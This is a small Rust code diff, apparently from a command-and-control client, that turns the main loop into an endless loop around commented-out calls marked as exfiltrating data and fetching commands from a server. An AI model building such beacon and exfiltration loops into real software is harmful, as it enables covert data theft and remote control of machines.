@@ -33,11 +33,11 @@ async fn main() {
         }
     });
 
-    for i in 1..10{
+    loop{
         //exfiltrates data
         // server.send_data(&id, "HHHH").await;
         // sleep(Duration::from_secs(5));
-
-        println!("{}",unwrap_or_panic!(server.get_command(&id).await));
+        // returns the command
+        // let rec = unwrap_or_panic!(server.get_command(&id).await);        
     }    
 }
